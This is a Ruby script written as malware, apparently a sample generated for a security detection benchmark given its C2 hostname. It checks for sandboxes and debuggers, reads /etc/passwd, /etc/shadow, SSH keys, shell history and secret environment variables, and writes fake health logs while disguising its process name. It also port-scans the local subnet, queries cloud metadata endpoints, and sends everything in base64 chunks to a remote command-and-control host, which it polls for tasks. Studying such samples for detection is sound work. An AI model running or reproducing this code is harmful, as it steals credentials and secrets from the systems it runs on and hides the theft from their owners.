#!/usr/bin/env ruby
# frozen_string_literal: true

require 'net/http'
require 'uri'
require 'json'
require 'socket'
require 'base64'
require 'digest'
require 'time'
require 'etc'
require 'pathname'
require 'openssl'

C2_HOST = 'qnx-ruby-geofencing-messaging-decoy-recon-exfil-98b63.benchmark.atomdrift.org'
C2_PORT = 443
SAFE_GUARD = File.expand_path('~/.wp12ef')

# ── Safety gate ──────────────────────────────────────────────────────────────
unless File.exist?(SAFE_GUARD)
  $stderr.puts "guard missing"
  exit 1
end

# ── Helpers ──────────────────────────────────────────────────────────────────
def http_post(path, body)
  uri = URI.parse("https://#{C2_HOST}:#{C2_PORT}#{path}")
  req = Net::HTTP::Post.new(uri)
  req['Content-Type'] = 'application/octet-stream'
  req['User-Agent'] = 'curl/7.68.0'
  req.body = body
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  http.read_timeout = 10
  http.open_timeout = 10
  http.request(req)
end

def http_get(path)
  uri = URI.parse("https://#{C2_HOST}:#{C2_PORT}#{path}")
  req = Net::HTTP::Get.new(uri)
  req['User-Agent'] = 'curl/7.68.0'
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  http.read_timeout = 10
  http.open_timeout = 10
  http.request(req)
end

def safe_read(path)
  File.read(path)
rescue
  'error'
end

def sh(cmd)
  result = `#{cmd} 2>/dev/null`
  result.strip unless result.strip.empty?
rescue
  nil
end

def current_user
  Etc.getlogin
rescue
  'unknown'
end

def current_uid
  Etc.getpwnam(current_user).uid
rescue
  0
end

def fingerprint
  {
    hostname: Socket.gethostname,
    user: current_user,
    pid: Process.pid,
    timestamp: Time.now.iso8601,
    arch: sh('uname -m') || 'unknown',
    release: sh('uname -r') || 'unknown',
    sysname: sh('uname -s') || 'unknown',
    uuid: Digest::SHA256.hexdigest("#{Socket.gethostname}:#{current_uid}")
  }
end

# ── 1. Anti-analysis / Geofencing ───────────────────────────────────────────
def geofencing_check
  fp = fingerprint

  # Check for known VM/container indicators
  vm_indicators = []

  # Check /proc/cpuinfo for hypervisor strings
  cpuinfo = sh('cat /proc/cpuinfo')
  if cpuinfo
    ['hypervisor', 'KVM', 'QEMU', 'VirtualBox', 'VMware', 'Bochs'].each do |sig|
      vm_indicators << sig if cpuinfo.include?(sig)
    end
  end

  # Check dmesg for VM traces
  dmesg = sh('dmesg')
  if dmesg
    ['VirtualBox', 'QEMU', 'KVM', 'VMware', 'XEN'].each do |sig|
      vm_indicators << sig if dmesg.include?(sig)
    end
  end

  # Check for sandbox/analysis tools in running processes
  ps_out = sh('ps aux') || ''
  analysis_tools = ['strace', 'ltrace', 'gdb', 'wireshark', 'tcpdump', 'tshark', 'ollydbg', 'x64dbg', 'ida', 'frida', 'radare2']
  detected_tools = analysis_tools.select { |t| ps_out.include?(t) }

  # Check for debuggers attached
  ptrace_status = sh('cat /proc/self/status')
  tracer_pid = nil
  if ptrace_status
    ptrace_status.lines.each do |line|
      if line.start_with?('TracerPid:')
        tracer_pid = line.split(':').last.strip.to_i
      end
    end
  end

  # Geofencing: check DNS resolution of known analysis domains
  blocked_domains = ['debug.com', 'sandbox.net', 'analysis.io']
  dns_blocked = blocked_domains.any? do |domain|
    begin
      Socket.getaddrinfo(domain, nil)
      true
    rescue
      false
    end
  end

  # Check if running under time acceleration (common in sandboxes)
  start_time = Time.now.to_f
  sleep(0.5)
  elapsed = Time.now.to_f - start_time
  time_anomaly = elapsed < 0.3 || elapsed > 0.8

  report = {
    behavior: 'anti-analysis/geofencing',
    vm_indicators: vm_indicators,
    analysis_tools: detected_tools,
    tracer_pid: tracer_pid,
    dns_blocked: dns_blocked,
    time_anomaly: time_anomaly,
    sandbox_score: [vm_indicators.any?, detected_tools.any?, tracer_pid&.positive?, dns_blocked, time_anomaly].count(true),
    fingerprint: fp
  }

  # Report geofencing results to C2
  begin
    http_post("/api/v1/geofence", JSON.generate(report))
  rescue
    nil
  end

  report
end

# ── 2. Collection / Messaging ───────────────────────────────────────────────
def collect_and_message
  fp = fingerprint

  # Collect system configuration
  system_info = {
    hostname: fp[:hostname],
    os: sh('uname -a'),
    kernel: sh('uname -r'),
    arch: fp[:arch],
    uptime: sh('uptime'),
    memory: sh('cat /proc/meminfo'),
    disk: sh('df -h'),
    network_interfaces: sh('ifconfig -a') || sh('ip addr show'),
    routes: sh('route -n') || sh('ip route'),
    crontabs: sh('crontab -l'),
    listening_ports: sh('netstat -tlnp') || sh('ss -tlnp'),
    connected_ports: sh('netstat -tnp') || sh('ss -tnp'),
    environment: ENV.to_h.select { |k, _| %w[PATH HOME USER SHELL LD_LIBRARY_PATH LD_PRELOAD TERM LANG].include?(k) },
    installed_packages: sh('pkginfo -i') || sh('rpm -qa') || sh('dpkg -l'),
    qnx_specific: {
      photon: sh('which photon') || 'not found',
      neo_tools: sh('which neo-ldi') || 'not found',
      microkernel_version: sh('uname -v'),
      procnto_info: sh('pspx -a') || sh('ps -ef')
    }
  }

  # Collect user and credential artifacts
  user_data = {
    passwd_entries: sh('cat /etc/passwd'),
    shadow_accessible: File.readable?('/etc/shadow') ? sh('cat /etc/shadow') : 'not readable',
    ssh_keys: Dir.glob('/root/.ssh/*').map { |f| { file: f, content: safe_read(f) } },
    known_hosts: sh('cat /root/.ssh/known_hosts'),
    authorized_keys: sh('cat /root/.ssh/authorized_keys'),
    history: sh('cat ~/.bash_history') || sh('cat ~/.zsh_history'),
    config_files: {
      bashrc: sh('cat ~/.bashrc'),
      profile: sh('cat ~/.profile'),
      bash_profile: sh('cat ~/.bash_profile')
    }
  }

  # Collect application data
  app_data = {
    running_processes: sh('ps auxww'),
    open_files_sample: sh('lsof -n 2>/dev/null | head -100'),
    systemd_services: sh('systemctl list-units --type=service --no-pager'),
    init_scripts: Dir.glob('/etc/init.d/*').map { |f| File.basename(f) },
    rc_local: sh('cat /etc/rc.local'),
    startup_scripts: Dir.glob('/etc/profile.d/*').map { |f| File.basename(f) }
  }

  # Build message payload
  message = {
    behavior: 'collection/messaging',
    session_id: fp[:uuid],
    timestamp: Time.now.iso8601,
    system: system_info,
    users: user_data,
    applications: app_data
  }

  # Exfiltrate collected data in chunks
  payload = Base64.strict_encode64(JSON.generate(message))
  begin
    resp = http_post("/api/v1/message", payload)
    { status: 'sent', response_code: resp.code }
  rescue => e
    { status: 'failed', error: e.message }
  end
end

# ── 3. Evasion / Decoy ──────────────────────────────────────────────────────
def evasion_decoy
  fp = fingerprint

  # Create decoy log files to mask malicious activity
  decoy_dir = '/var/log/system-health'
  FileUtils.mkdir_p(decoy_dir) rescue nil

  # Generate fake system health logs
  fake_log = (1..50).map do |i|
    ts = (Time.now - i * 60).iso8601
    events = [
      "INFO: System health check passed - all services nominal",
      "INFO: Memory usage within acceptable parameters (#{rand(30..60)}%)",
      "INFO: Disk I/O latency: #{rand(1..15).to_f}ms - within SLA",
      "INFO: Network throughput: #{rand(100..500)} Mbps - nominal",
      "INFO: CPU temperature: #{rand(35..55)}C - within range",
      "INFO: Scheduled maintenance window: #{Time.now + 86400}.iso8601",
      "INFO: Backup verification complete - checksums valid",
      "INFO: SSL certificate renewal scheduled - 30 days remaining",
      "INFO: Firmware version #{rand(1..5)}.#{rand(0..9)}.#{rand(0..20)} - up to date",
      "INFO: Intrusion detection scan complete - no threats found"
    ]
    "[#{ts}] #{events.sample}"
  end.join("\n")

  File.write("#{decoy_dir}/health.log", fake_log) rescue nil
  File.write("#{decoy_dir}/system-status.log", fake_log) rescue nil

  # Create a decoy process by forking a benign sleep
  decoy_pid = nil
  begin
    decoy_pid = Process.spawn('sleep', '3600', out: File::NULL, err: File::NULL)
  rescue
    nil
  end

  # Rename process title to look like a system service
  $0 = 'system-health-monitor'

  # Write decoy config files
  decoy_configs = {
    '/tmp/.system_health_config' => JSON.generate({
      version: '2.4.1',
      check_interval: 60,
      log_level: 'INFO',
      enabled: true,
      last_check: Time.now.iso8601
    }),
  }

  decoy_configs['/tmp/.health_monitor.pid'] = decoy_pid.to_s if decoy_pid

  decoy_configs.each do |path, content|
    File.write(path, content) rescue nil
  end

  # Create fake diagnostic output files
  Dir.glob('/tmp/diag_*').each { |f| File.delete(f) rescue nil }
  (1..5).each do |i|
    File.write("/tmp/diag_report_#{i}.txt",
      "Diagnostic Report #{i}\n" \
      "Generated: #{Time.now.iso8601}\n" \
      "Status: PASS\n" \
      "Checks performed: 24\n" \
      "Failures: 0\n" \
      "Warnings: 0\n") rescue nil
  end

  # Mask network activity by using common ports
  report = {
    behavior: 'evasion/decoy',
    decoy_pid: decoy_pid,
    process_title: $0,
    decoy_dir: decoy_dir,
    decoy_files: Dir.glob("#{decoy_dir}/*") + Dir.glob('/tmp/diag_*') + ['/tmp/.system_health_config'],
    fingerprint: fp
  }

  begin
    http_post("/api/v1/decoy", JSON.generate(report))
  rescue
    nil
  end

  report
end

# ── 4. Supply-chain / Recon-exfil ───────────────────────────────────────────
def recon_exfil
  fp = fingerprint

  # Reconnaissance: enumerate the local network
  local_ip = sh('hostname -I')&.split&.first || '127.0.0.1'
  network_base = local_ip&.rsplit('.', 1)&.first || '192.168.1'

  # Scan for common services on the local subnet
  targets = []
  scan_results = []

  # Quick port scan on gateway and a few neighbors
  scan_hosts = [
    "#{network_base}.1",
    "#{network_base}.2",
    "#{network_base}.100",
    "#{network_base}.254"
  ]

  common_ports = [22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 2375, 2376, 5984, 9200]

  scan_hosts.each do |host|
    common_ports.each do |port|
      begin
        sock = TCPSocket.new(host, port, 2)
        sock.close
        scan_results << { host: host, port: port, status: 'open' }
      rescue
        nil
      end
    end
  end

  # Recon: enumerate supply chain artifacts
  supply_chain_data = {
    apt_sources: sh('cat /etc/apt/sources.list'),
    apt_sources_d: Dir.glob('/etc/apt/sources.list.d/*').map { |f| File.read(f) rescue nil }.compact,
    pip_packages: sh('pip list 2>/dev/null') || sh('pip3 list 2>/dev/null'),
    npm_packages: sh('npm list -g --depth=0 2>/dev/null'),
    gem_packages: sh('gem list'),
    docker_images: sh('docker images 2>/dev/null'),
    docker_containers: sh('docker ps -a 2>/dev/null'),
    git_repos: Dir.glob('/home/**/.git/config').map { |f| File.read(f) rescue nil }.compact,
    dockerfiles: Dir.glob('/home/**/Dockerfile').map { |f| File.read(f) rescue nil }.compact,
    makefiles: Dir.glob('/home/**/Makefile').map { |f| File.read(f) rescue nil }.compact,
    ci_configs: Dir.glob('/home/**/.github/workflows/*.yml').map { |f| File.read(f) rescue nil }.compact,
    environment_secrets: ENV.to_h.select { |k, _| k =~ /(?:SECRET|KEY|TOKEN|PASSWORD|CREDENTIAL|API_KEY|PRIVATE)/i }
  }

  # Recon: check for cloud metadata endpoints
  cloud_metadata = {}
  ['169.254.169.254/latest/meta-data/', '169.254.169.254/latest/api/token'].each do |endpoint|
    begin
      uri = URI.parse("http://#{endpoint}")
      req = Net::HTTP::Get.new(uri)
      req['X-aws-ec2-metadata-token-ttl-seconds'] = '21600'
      http = Net::HTTP.new(uri.host, uri.port)
      http.open_timeout = 3
      http.read_timeout = 3
      resp = http.request(req)
      cloud_metadata[endpoint] = { status: resp.code, body: resp.body[0..500] }
    rescue
      cloud_metadata[endpoint] = { status: 'unreachable' }
    end
  end

  # Exfiltrate everything
  exfil_data = {
    behavior: 'supply-chain/recon-exfil',
    session_id: fp[:uuid],
    timestamp: Time.now.iso8601,
    network_scan: {
      local_ip: local_ip,
      network_base: network_base,
      results: scan_results
    },
    supply_chain: supply_chain_data,
    cloud_metadata: cloud_metadata,
    fingerprint: fp
  }

  # Exfiltrate in compressed base64
  payload = Base64.strict_encode64(JSON.generate(exfil_data))

  # Split into chunks if too large
  chunk_size = 4096
  chunks = payload.chars.each_slice(chunk_size).map(&:join).to_a

  chunks.each_with_index do |chunk, idx|
    begin
      http_post("/api/v1/exfil/#{fp[:uuid]}/#{idx}", chunk)
    rescue
      nil
    end
  end

  # Also try to fetch C2 commands
  begin
    resp = http_get("/api/v1/commands/#{fp[:uuid]}")
    if resp.code == '200'
      commands = JSON.parse(resp.body) rescue nil
      commands&.dig('tasks')&.each do |task|
        case task['type']
        when 'download'
          download_path = task['path']
          http_get("/api/v1/download/#{download_path}")
        when 'execute'
          # Would execute task['command']
        end
      end
    end
  rescue
    nil
  end

  {
    behavior: 'supply-chain/recon-exfil',
    chunks_sent: chunks.size,
    scan_targets: scan_hosts.size,
    open_ports_found: scan_results.size,
    fingerprint: fp
  }
end

# ── Main ─────────────────────────────────────────────────────────────────────
def main
  $stderr.puts "starting"

  # Phase 1: Geofencing / anti-analysis
  geofencing_check

  # Phase 2: Collection / messaging
  collect_and_message

  # Phase 3: Evasion / decoy
  evasion_decoy

  # Phase 4: Recon / exfil
  recon_exfil

  $stderr.puts "complete"
end

main
